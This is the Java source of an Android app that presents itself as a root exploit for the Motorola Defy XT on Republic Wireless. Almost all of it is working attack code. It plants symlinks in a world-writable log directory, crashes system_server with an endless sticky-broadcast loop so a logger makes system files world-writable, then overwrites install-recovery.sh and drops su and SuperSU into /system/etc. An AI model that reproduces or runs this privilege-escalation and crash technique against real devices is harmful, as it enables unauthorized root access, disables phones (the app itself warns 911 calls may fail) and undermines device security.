/*
 *   This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>. 
 *  
 *  @author Justin Case (jcase@cunninglogic.com, http://twitter.com/TeamAndirc)
 */

package com.cunninglogic.cyanide;


import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.res.AssetManager;
import android.os.Bundle;

public class MainActivity extends Activity {

ProgressDialog pd;

@Override
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);
	 
	//Check whether we are one stage2 or not
	boolean stage2 = new File("/data/last_alog/onboot").exists();
	
	if (stage2) {
		
		//Momma always said to keep a clean house
		exec("rm /data/last_alog/*");
		
		//Backup install-recovery.sh, so we can restore all files back to normal later with root.sh
		exec("cat /system/etc/install-recovery.sh > /system/etc/install-recovery.sh.backup");
		
		//Drop su and supersy.apk for installation by root.sh
		extractAsset("su", "/system/etc/su", this);
		extractAsset("supersu.apk", "/system/etc/supersu.apk", this);
		
		//Replace install-recovery.sh with our own script, so
		extractAsset("root.sh", "/system/etc/install-recovery.sh", this);
		
		exec("chmod 755 /system/etc/install-recovery.sh");
		
		//Crash system_server, force a reboot.
		kaBoom(MainActivity.this);
		
	} else {

		AlertDialog alertDialog = new AlertDialog.Builder(this).create();
		alertDialog.setTitle("Warning");
		alertDialog.setCancelable(false);
		alertDialog.setMessage("Paypal donations can be made to jcase@cunninglogic.com\n\nThis is a root exploit for the Motorola Defy XT for" +
				" Republic Wireless. This app could potentially damage your device! This app could potentially interfere with the use of your" +
				" phone. It could prevent calls to 911 from working. By clicking agree, you Agree to not hold anyone, but yourself, responsible" +
				" for any damage, or loss due to the use of this app.");
		alertDialog.setButton("Agree", new DialogInterface.OnClickListener() {
		
			public void onClick(DialogInterface dialog, int id) {
				
				//Clean up any mess from previous attempts that might of gone wrong.
				exec("rm /data/last_alog/*");
				
				//Mark that stage1 has ran
				exec("echo 1 > /data/last_alog/onboot");
				
				//Motorola/Republic Wireless's engineers made a big mistake, left /system mounted r/w, whoops.
				
				///system/bin/loggerlauncher runs "chmod 777 /data/last_alog/*" whenever something critical crashes
				//and /data/last_alog is world writable by defualt, so lets setup a symlink attack
			    exec("ln -s /system/etc /data/last_alog/with_love_from_jcase");
			    exec("ln -s /system/etc/install-recovery.sh /data/last_alog/i_like_pie");
			    
			    //Crash system_sever, and make our targets world r/w/x
			    kaBoom(MainActivity.this);
			}
		}); 
		
		alertDialog.setButton2("Disagree", new DialogInterface.OnClickListener() {
		
			 public void onClick(DialogInterface dialog, int id) {
			
			    finish();
			
			}
		});
	
				
		alertDialog.show();
	}
}

public static void kaBoom(Context context) {
	
	//Flood the system with a wifi state_change stickybroadcast, crashing system_server and forcing a reboot.
	//Credit to Reid Holland for tipping me to this bug.
	while(true){
		context.sendStickyBroadcast(new Intent("android.net.wifi.STATE_CHANGE"));
	}
}

public static void extractAsset(String file, String path, Context context){
    
	AssetManager assetManager = context.getAssets();
	    
	InputStream in = null;
	OutputStream out = null;
	    
	try {
		in = assetManager.open(file);
		out = new FileOutputStream(path);
		copyFile(in, out);
		in.close();
		in = null;
		out.flush();
		out.close();
		out = null;
	} catch(Exception e) {
	         
	}   
    
}

public static void copyFile(InputStream in, OutputStream out) throws IOException {
	byte[] buffer = new byte[1024];
	int read;
	while((read = in.read(buffer)) != -1){
		out.write(buffer, 0, read);
	}
}


public static void exec(String cmd){

	try {
		Process process = Runtime.getRuntime().exec("sh");
		DataOutputStream os = new DataOutputStream(process.getOutputStream());
		os.writeBytes(cmd + "\n");
		os.writeBytes("exit\n");
		os.flush();
		
	} catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
	}
}